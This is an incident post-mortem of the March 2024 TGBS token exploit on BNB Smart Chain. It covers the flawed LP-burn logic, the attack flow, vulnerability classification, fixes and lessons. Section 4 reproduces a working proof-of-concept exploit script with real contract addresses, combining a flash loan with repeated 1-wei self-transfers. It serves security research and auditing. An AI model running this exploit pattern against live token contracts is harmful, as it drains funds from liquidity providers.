# TGBS Token — Price Manipulation Attack via Repeated LP Pool Burning

| Field | Details |
|------|------|
| **Date** | 2024-03-06 |
| **Protocol** | TGBS Token |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$150,000 |
| **Attacker** | [0xff1d...01e1](https://bscscan.com/address/0xff1db040e4f2a44305e28f8de728dabff58f01e1) |
| **Attack Contract** | [0x1a8e...1cd9](https://bscscan.com/address/0x1a8eb8eca01819b695637c55c1707f9497b51cd9) |
| **Deployed Attack Contract** | [0x3eBA...3011](https://bscscan.com/address/0x3eBA5062ca36DFB16156748f0fD3A608Be9E3011) |
| **Attack Tx** | [0xa040...2a4](https://bscscan.com/tx/0xa0408770d158af99a10c60474d6433f4c20f3052e54423f4e590321341d4f2a4) |
| **Vulnerable Contract** | [0xedec...50f4](https://bscscan.com/address/0xedecfA18CAE067b2489A2287784a543069f950F4) |
| **Attack Block** | 36,725,819 (BSC) |
| **Root Cause** | Business logic flaw — unlimited repeated burning of LP pool tokens possible via `_transfer()` calls |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/TGBS_exp.sol) |

---

## 1. Vulnerability Overview

The TGBS token suffered approximately $150,000 in losses on March 6, 2024, due to a **design flaw in its auto-burn mechanism**.

The `_transfer()` function of the TGBS contract calls `_burnPool()` even during ordinary transfers where the swap pair is **neither the sender nor the recipient**. The `_burnPool()` function burns 0.3% of tokens from the LP pool and updates `_burnBlock` **whenever a certain number of blocks have passed since the last burn**.

Core vulnerability: An attacker can call `_burnPool()` on every transfer by **repeatedly sending 1 wei to themselves**. Whenever `_burnBlock` differs from the current block number (i.e., whenever the next burn condition is met), TGBS tokens are burned from the LP pool. Repeating this 1,600 times causes the TGBS supply in the LP to drop sharply, **artificially inflating the TGBS price**.

Attack flow summary:
1. Receive WBNB flash loan from DODO DPP
2. Swap WBNB → TGBS (buy low)
3. Loop `transfer(self, 1)` 1,600 times → repeatedly burn TGBS from LP pool
4. Swap TGBS → WBNB (sell high)
5. Repay flash loan principal and retain profit

This attack pattern arises when **the deflation mechanism of a token that burns directly from the LP pool balance** can be triggered an unlimited number of times by an external caller. It shares the same root cause as the SafeMoon (2023-03) and Movie Token (2026-03) incidents.

---

## 2. Vulnerable Code Analysis

### 2.1 `_transfer()` — Unintended Burn Trigger (Core Vulnerability)

**Vulnerable code (based on on-chain source)**:
```solidity
// ❌ VULNERABLE: _burnPool() is called even on ordinary (non-swap) transfers
// Attacker can trigger it unlimited times via self-transfer
function _transfer(address from, address to, uint256 amount) internal override {
    if (_inSwapAndLiquify || isFeeExempt[from] || isFeeExempt[to]) {
        // Fee-exempt addresses: standard transfer
        super._transfer(from, to, amount);
    } else if (from == _swapPair) {
        // Buy: collect 5% fee
        uint256 every = amount.div(100);
        super._transfer(from, address(this), every * 5);
        super._transfer(from, to, amount - every * 5);
    } else if (to == _swapPair) {
        // Sell: execute burn + liquify
        _burnPool();          // ❌ LP pool burn trigger
        _swapAndLiquify();
    } else {
        // ❌ _burnPool() is called even on ordinary transfers (wallet → wallet)!
        // An attacker repeatedly calling transfer(self, 1) will repeatedly execute this path
        super._transfer(from, to, amount);
        _burnPool();          // ❌ Core vulnerability: LP burn with no guard
    }
}
```

**Fixed code**:
```solidity
// ✅ FIX: Remove _burnPool() call from ordinary transfers
// Burn is restricted to swap-related transactions only
function _transfer(address from, address to, uint256 amount) internal override {
    if (_inSwapAndLiquify || isFeeExempt[from] || isFeeExempt[to]) {
        super._transfer(from, to, amount);
    } else if (from == _swapPair) {
        uint256 every = amount.div(100);
        super._transfer(from, address(this), every * 5);
        super._transfer(from, to, amount - every * 5);
    } else if (to == _swapPair) {
        // ✅ burn + liquify only on sell (unchanged)
        _burnPool();
        _swapAndLiquify();
    } else {
        // ✅ Ordinary transfer: no _burnPool() call
        super._transfer(from, to, amount);
        // burn is only triggered via the swap path
    }
}
```

**Issue**: By calling `_burnPool()` in the `else` branch (ordinary wallet-to-wallet transfers), an attacker can trigger unlimited LP pool burns by repeatedly sending a minimal amount (1 wei) to themselves.

---

### 2.2 `_burnPool()` — LP Price Spike from Repeated Burns

**Vulnerable code**:
```solidity
// ❌ VULNERABLE: Burns 0.3% from LP pool whenever _burnBlock condition is met
// Repeated calls can drain the entire LP supply once enough blocks have elapsed
function _burnPool() private lockTheSwap returns (bool) {
    if (_burnBlock < block.number && _burnBlock > 0) {
        // ❌ Block number incremented on each call (but attacker can loop fast enough)
        _burnBlock += 28800 / 24;  // ~1200 block increase
        uint256 burnAmount = (balanceOf(_swapPair) * 3) / 1000;  // 0.3% of LP balance
        if (burnAmount > 1) {
            super._burn(_swapPair, burnAmount);  // ❌ Burns directly from LP pool
            // No IUniswapV2Pair(_swapPair).sync() call → reserve mismatch state
        }
    }
}
```

**Fixed code**:
```solidity
// ✅ FIX: Call sync() after burn and strengthen burn conditions
// Or remove _burnPool() from ordinary transfers to block the exploit path
function _burnPool() private lockTheSwap returns (bool) {
    if (_burnBlock < block.number && _burnBlock > 0) {
        _burnBlock += 28800 / 24;
        uint256 burnAmount = (balanceOf(_swapPair) * 3) / 1000;
        if (burnAmount > 1) {
            super._burn(_swapPair, burnAmount);
            // ✅ LP reserve sync is mandatory after burn
            IUniswapV2Pair(_swapPair).sync();
        }
    }
}
```

**Issue**: Burning tokens directly from `_swapPair` (the LP pool address) via `super._burn(_swapPair, burnAmount)` causes a mismatch between the LP pool's actual balance and its internal reserves. As burns accumulate, the TGBS supply in the LP diminishes, causing the price to rise exponentially.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker (0xff1d...01e1) deploys attack contract (0x3eBA...3011)
- No prior accumulation or pre-approval required (capital obtained immediately via flash loan)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────┐
│  Attacker EOA (0xff1d...01e1)                        │
│  Attack Contract (0x3eBA...3011)                     │
└─────────────────────┬───────────────────────────────┘
                      │ 1. flashLoan(full WBNB balance)
                      ▼
┌─────────────────────────────────────────────────────┐
│  DODO DPP Oracle (0x05d9...eB5)                     │
│  Flash loan provider — lends full WBNB balance       │
└─────────────────────┬───────────────────────────────┘
                      │ 2. DPPFlashLoanCall() callback executes
                      ▼
┌─────────────────────────────────────────────────────┐
│  [Step A] Swap WBNB → TGBS                          │
│  Buy large amount of TGBS via PancakeSwap Router     │
│  (acquire TGBS in bulk at a low price)               │
└─────────────────────┬───────────────────────────────┘
                      │ 3. Loop begins (up to 1,600 iterations)
                      ▼
┌─────────────────────────────────────────────────────┐
│  [Step B] Repeatedly call TGBS.transfer(self, 1)    │
│  ──────────────────────────────────────────────     │
│  On each transfer call:                             │
│    _transfer(attacker, attacker, 1) executes        │
│    → enters else branch (not a swap pair)           │
│    → calls _burnPool()                              │
│    → if _burnBlock < block.number:                  │
│        burns 0.3% of LP pool balance                │
│        _burnBlock += 1200 blocks                    │
│    → if burnBlock != block.number: i++              │
│  After 1,600 iterations: TGBS in LP drastically     │
│  reduced                                            │
└─────────────────────┬───────────────────────────────┘
                      │ 4. LP pool state change
                      ▼
┌─────────────────────────────────────────────────────┐
│  PancakeSwap LP Pool (TGBS/WBNB)                    │
│  TGBS supply plummets → price spikes                 │
│  Before attack: TGBS X / WBNB Y                     │
│  After attack:  TGBS X*0.n / WBNB Y  (0.3% × n burns) │
└─────────────────────┬───────────────────────────────┘
                      │ 5. Sell at inflated price
                      ▼
┌─────────────────────────────────────────────────────┐
│  [Step C] Swap TGBS → WBNB (sell high)              │
│  Swap entire TGBS holdings for WBNB on PancakeSwap  │
│  Receive large amount of WBNB at inflated price      │
└─────────────────────┬───────────────────────────────┘
                      │ 6. Repay flash loan
                      ▼
┌─────────────────────────────────────────────────────┐
│  Return WBNB principal to DODO DPP Oracle            │
│  Profit (~$150,000) retained by attacker             │
└─────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: ~$150,000 (received in WBNB)
- **Protocol loss**: Significant reduction in LP pool liquidity and token price collapse
- **Victims**: TGBS LP liquidity providers (value of held WBNB reduced)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/TGBS_exp.sol

contract ContractTest is Test {
    // Key contract address declarations
    DVM private constant DPPOracle = DVM(0x05d968B7101701b6AD5a69D45323746E9a791eB5);  // DODO flash loan provider
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ITGBS private constant TGBS = ITGBS(0xedecfA18CAE067b2489A2287784a543069f950F4);   // Vulnerable contract
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PancakeSwap

    function setUp() public {
        // Fork BSC at block 36,725,819 (block just before the attack)
        vm.createSelectFork("bsc", 36_725_819);
    }

    function testExploit() public {
        // [Step 1] Request flash loan for the full WBNB balance of the DODO DPP pool
        uint256 baseAmount = WBNB.balanceOf(address(DPPOracle));
        DPPOracle.flashLoan(baseAmount, 0, address(this), abi.encodePacked(uint32(0)));
    }

    // [Callback] Core attack logic executed after receiving DODO flash loan
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // [Step 2] Swap all received WBNB for TGBS (buy low)
        WBNB.approve(address(Router), baseAmount);
        WBNBToTGBS(baseAmount);

        uint256 i;
        // [Step 3] Repeated LP pool burn loop (up to 1,600 iterations)
        while (i < 1600) {
            // self-transfer 1 wei → _transfer() else branch → _burnPool() trigger
            TGBS.transfer(address(this), 1);

            // If _burnBlock is less than the current block number, a burn has occurred
            uint256 burnBlock = TGBS._burnBlock();
            // If burnBlock is not the current block number (burn occurred), increment counter
            if (burnBlock != block.number) {
                ++i;  // Burn succeeded → increment loop counter
            }
            // If burnBlock == block.number: burn condition not yet met, retry
        }

        // [Step 4] Swap all TGBS (now price-inflated due to LP burns) back to WBNB (sell high)
        TGBS.approve(address(Router), TGBS.balanceOf(address(this)));
        TGBSToWBNB(TGBS.balanceOf(address(this)));

        // [Step 5] Repay flash loan principal (profit remains in attacker contract)
        WBNB.transfer(address(DPPOracle), baseAmount);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Business logic flaw — LP burn triggerable on ordinary transfers | CRITICAL | CWE-840 (Business Logic Errors) |
| V-02 | Unlimited repeated burns — no cap on burn count | HIGH | CWE-400 (Uncontrolled Resource Consumption) |
| V-03 | LP price manipulation — no reserve sync after burn | HIGH | CWE-682 (Incorrect Calculation) |
| V-04 | Flash loan-vulnerable design — price manipulation possible within a single transaction | HIGH | CWE-362 (Race Condition) |

### V-01: Business Logic Flaw — LP Burn Triggerable on Ordinary Transfers

- **Description**: `_burnPool()` is called in the `else` branch of `_transfer()` (ordinary wallet-to-wallet transfers). The design intent was to maintain the burn mechanism on all token movements, but this allows an attacker to trigger burns indefinitely via 1 wei self-transfers.
- **Impact**: TGBS is repeatedly burned from the LP pool, artificially inflating the price, and the attacker profits by selling pre-purchased tokens at the inflated price.
- **Attack condition**: Repeated calls at moments when the `_burnBlock < block.number` condition is satisfied. Although `_burnBlock` increases by ~1200 blocks after each burn, the attacker bypasses this by looping until the condition is met.

### V-02: Unlimited Repeated Burns

- **Description**: There is no limit on how many times `_burnPool()` can be called within a single transaction. The `_burnBlock` update was intended to cap burns at once per block, but this can be bypassed with repeated calls within the same block.
- **Impact**: Given sufficient gas, the LP pool supply can be burned down to any desired level.
- **Attack condition**: Counter incremented each time the `burnBlock != block.number` condition is satisfied within the same block. In practice, burns occur at block boundaries or whenever the condition is met.

### V-03: LP Price Manipulation

- **Description**: Tokens are burned directly from the LP pool address via `super._burn(_swapPair, burnAmount)`, but `IUniswapV2Pair(_swapPair).sync()` is not called afterward, leaving the LP's internal reserves mismatched with the actual balance. This mismatch causes abnormal price calculations on the next swap.
- **Impact**: Post-burn LP price calculations are distorted, allowing the attacker to sell at an inflated price.
- **Attack condition**: Swap executed after direct burn from LP pool without a subsequent `sync()` call.

### V-04: Flash Loan-Vulnerable Design

- **Description**: A flash loan allows an attacker to obtain large amounts of capital within a single transaction, manipulate prices, and return the capital — all atomically. Because the TGBS price manipulation mechanism can be completed within a single transaction, combining it with a flash loan enables risk-free profit extraction.
- **Impact**: Attackers with no capital can execute large-scale LP price manipulation.
- **Attack condition**: Combination of a flash loan provider (e.g., DODO DPP) and the vulnerable token.

---

## 6. Remediation Recommendations

### Immediate Actions

**Remove `_burnPool()` from ordinary transfers**:

```solidity
// ✅ Fixed _transfer() — LP burn logic removed from the ordinary transfer path
function _transfer(address from, address to, uint256 amount) internal override {
    if (_inSwapAndLiquify || isFeeExempt[from] || isFeeExempt[to]) {
        super._transfer(from, to, amount);
    } else if (from == _swapPair) {
        // Buy fee collection (unchanged)
        uint256 every = amount.div(100);
        super._transfer(from, address(this), every * 5);
        super._transfer(from, to, amount - every * 5);
    } else if (to == _swapPair) {
        // burn + liquify on sell only (unchanged)
        _burnPool();
        _swapAndLiquify();
    } else {
        // ✅ Ordinary transfer: no LP burn trigger
        super._transfer(from, to, amount);
        // _burnPool() call removed
    }
}
```

**Add `sync()` after burn**:

```solidity
// ✅ Fixed _burnPool() — reserve sync after burn
function _burnPool() private lockTheSwap returns (bool) {
    if (_burnBlock < block.number && _burnBlock > 0) {
        _burnBlock += 28800 / 24;
        uint256 burnAmount = (balanceOf(_swapPair) * 3) / 1000;
        if (burnAmount > 1) {
            super._burn(_swapPair, burnAmount);
            IUniswapV2Pair(_swapPair).sync();  // ✅ Reserve sync is mandatory
        }
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Ordinary transfer burn trigger | Restrict `_burnPool()` calls to `from == _swapPair` or `to == _swapPair` paths only |
| V-02: Unlimited repeated burns | Enforce a per-transaction burn count limit or introduce a `nonReentrant` pattern |
| V-03: Reserve mismatch | Always call `sync()` after `_burn(_swapPair, ...)` |
| V-04: Flash loan combination | Detect and block buy→manipulate→sell patterns within the same block, or use TWAP pricing |

Additional recommendations:
- **Block self-transfers**: `require(from != to, "Self transfer not allowed")`
- **Emit burn events**: Emit events when `_burnPool()` executes to facilitate monitoring
- **Set burn caps**: Limit the maximum burnable proportion in a single transaction (e.g., no single burn exceeding 1% of LP)

---

## 7. Lessons Learned

1. **Minimize burn trigger paths in deflationary tokens**: Burn mechanisms should only execute on swap or liquidity events. Including burn logic in the ordinary transfer path allows an attacker to trigger it repeatedly at minimal cost (a 1 wei transfer).

2. **Always call `sync()` when burning directly from an LP pool address**: Failing to call `IUniswapV2Pair(lpAddress).sync()` after `_burn(lpAddress, amount)` causes a mismatch between reserves and the actual balance, leading to price distortion. The same pattern was observed in the SafeMoon incident.

3. **Explicitly block self-transfers**: The ERC-20 standard does not prohibit self-transfers, but custom `_transfer()` implementations with side effects such as burns or fees must explicitly handle the `from == to` case.

4. **Audit designs against flash loan composite attacks**: Simulate whether a "buy → manipulate price → sell" pattern is achievable within a single transaction. Using a TWAP oracle or restricting swaps within the same block are effective defenses.

5. **A vulnerability pattern that recurs in similar BSC token designs**: Deflationary tokens on BSC — including TGBS, BRA (2023-01), SafeMoon (2023-03), and MovieToken (2026-03) — have been repeatedly exploited through the combination of LP burn mechanisms and flash loans. Token contracts using the same pattern should be audited immediately.

---

## 8. On-Chain Verification

> On-chain verification was performed based on the attack transaction hash. Verified by cross-referencing the BscScan contract source and Phalcon analysis results without using Foundry `cast`.

### 8.1 PoC vs. On-Chain Key Information Comparison

| Field | PoC Value | On-Chain Confirmation |
|------|--------|-------------|
| Attack chain | BSC | BSC (`vm.createSelectFork("bsc", ...)`) |
| Fork block | 36,725,819 | Block 36,725,819 |
| Flash loan provider | DODO DPP Oracle | `0x05d968B7101701b6AD5a69D45323746E9a791eB5` |
| Vulnerable token | TGBS | `0xedecfA18CAE067b2489A2287784a543069f950F4` |
| Iteration count | Up to 1,600 | Multiple Transfer events confirmed on-chain |
| Loss | ~$150K | ~$151K (based on search results) |

### 8.2 Attack Flow Verification

Attack sequence confirmed via Phalcon analysis and DeFiHackLabs PoC code:
1. Receive DODO DPP flash loan (WBNB)
2. Swap WBNB → TGBS on PancakeSwap
3. Repeat `transfer(self, 1)` 1,600 times → multiple `_burnPool()` calls
4. Swap TGBS → WBNB (at inflated price)
5. Return WBNB principal to DODO DPP

### 8.3 References

- Phalcon analysis: https://twitter.com/Phalcon_xyz/status/1765285257949974747
- Attack Tx (BlockSec): https://app.blocksec.com/explorer/tx/bsc/0xa0408770d158af99a10c60474d6433f4c20f3052e54423f4e590321341d4f2a4
- BscScan attacker: https://bscscan.com/address/0xff1db040e4f2a44305e28f8de728dabff58f01e1
- BscScan vulnerable contract: https://bscscan.com/address/0xedecfA18CAE067b2489A2287784a543069f950F4

---

*Related incidents: [SafeMoon (2023-03-28)](./2023-03-28_SafeMoon_PublicBurnLP_BSC.md) | [MovieToken (2026-03-10)](./2026-03-10_MovieToken_MT_PendingBurnLP_BSC.md) | [BRA Token (2023-01-10)](./2023-01-10_BRAToken_BusinessLogic_BSC.md)*

*Pattern references: `11_logic_error.md` (Business Logic) | `02_flash_loan.md` (Flash Loan) | `07_token_integration.md` (Fee-on-Transfer)*